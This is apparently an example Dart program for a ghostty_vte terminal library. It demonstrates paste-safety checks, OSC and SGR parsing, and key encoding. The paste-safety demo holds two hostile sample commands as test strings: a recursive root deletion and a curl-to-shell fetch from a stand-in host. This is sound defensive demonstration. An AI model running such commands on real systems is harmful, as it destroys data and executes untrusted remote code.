import 'package:ghostty_vte/ghostty_vte.dart';

/// A pure Dart CLI example demonstrating the core ghostty_vte APIs:
///
/// - Paste safety checking
/// - OSC (Operating System Command) parsing
/// - SGR (Select Graphic Rendition) parsing
/// - Key event encoding
void main() {
  _demoPasteSafety();
  _demoOscParser();
  _demoSgrParser();
  _demoKeyEncoding();
}

// ---------------------------------------------------------------------------
// Paste safety
// ---------------------------------------------------------------------------

void _demoPasteSafety() {
  print('=== Paste Safety ===');

  final samples = {
    'ls -la': GhosttyVt.isPasteSafe('ls -la'),
    'echo hello': GhosttyVt.isPasteSafe('echo hello'),
    'rm -rf /\n': GhosttyVt.isPasteSafe('rm -rf /\n'),
    'curl evil.sh | sh\x1b':
        GhosttyVt.isPasteSafe('curl evil.sh | sh\x1b'),
  };

  for (final entry in samples.entries) {
    final label = entry.key.replaceAll('\n', '\\n').replaceAll('\x1b', '\\e');
    print('  "$label" → safe? ${entry.value}');
  }
  print('');
}

// ---------------------------------------------------------------------------
// OSC parser
// ---------------------------------------------------------------------------

void _demoOscParser() {
  print('=== OSC Parser ===');

  final osc = GhosttyVt.newOscParser();

  // Feed a complete OSC 0 (Set Window Title) sequence.
  // OSC format: ESC ] Ps ; Pt BEL
  osc.addByte(0x1B); // ESC
  osc.addByte(0x5D); // ]
  osc.addText('0;My Terminal Title');

  // Finalize with BEL (0x07) as the string terminator.
  final command = osc.end(terminator: 0x07);
  print('  Parsed OSC type: ${command.type}');
  if (command.windowTitle != null) {
    print('  Window title: ${command.windowTitle}');
  }

  osc.close();
  print('');
}

// ---------------------------------------------------------------------------
// SGR parser
// ---------------------------------------------------------------------------

void _demoSgrParser() {
  print('=== SGR Parser ===');

  final sgr = GhosttyVt.newSgrParser();

  // Parse a set of SGR parameters:
  //   1  = bold
  //   31 = red foreground
  //   4  = underline
  final attrs = sgr.parseParams([1, 31, 4]);
  for (final attr in attrs) {
    print('  SGR attribute: tag=${attr.tag}');
  }

  // Reset (SGR 0)
  final reset = sgr.parseParams([0]);
  for (final attr in reset) {
    print('  SGR attribute: tag=${attr.tag}');
  }

  sgr.close();
  print('');
}

// ---------------------------------------------------------------------------
// Key encoding
// ---------------------------------------------------------------------------

void _demoKeyEncoding() {
  print('=== Key Encoding ===');

  final event = GhosttyVt.newKeyEvent();
  final encoder = GhosttyVt.newKeyEncoder();

  // Encode an 'A' keypress
  event.key = GhosttyKey.GHOSTTY_KEY_A;
  event.action = GhosttyKeyAction.GHOSTTY_KEY_ACTION_PRESS;
  event.utf8Text = 'a';

  final encoded = encoder.encode(event);
  if (encoded.isNotEmpty) {
    final display = encoded
        .map((b) => b < 0x20
            ? '\\x${b.toRadixString(16).padLeft(2, '0')}'
            : String.fromCharCode(b))
        .join();
    print('  Key "a" encodes to: $display');
  } else {
    print('  Key "a" produced no output');
  }

  event.close();
  encoder.close();
  print('');
}
